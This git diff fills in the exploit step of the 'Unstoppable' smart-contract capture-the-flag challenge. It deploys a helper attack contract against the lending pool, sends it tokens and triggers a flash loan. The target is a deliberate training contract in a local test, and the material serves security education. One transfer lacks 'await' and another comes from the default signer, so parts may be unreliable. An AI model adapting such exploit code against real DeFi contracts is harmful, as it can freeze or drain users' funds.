@@ -39,7 +39,11 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const HackUnstoppableLenderFactory = await ethers.getContractFactory('HackUnstoppableLender', attacker);
+        this.hackReceiver = await HackUnstoppableLenderFactory.deploy(this.pool.address);
+        this.token.connect(attacker).transfer(this.hackReceiver.address, 1)
+        await this.token.transfer(this.hackReceiver.address, 1); //attacker has 100 tokens
+        await this.hackReceiver.executeFlashLoan(10);
     });
 
     after(async function () {
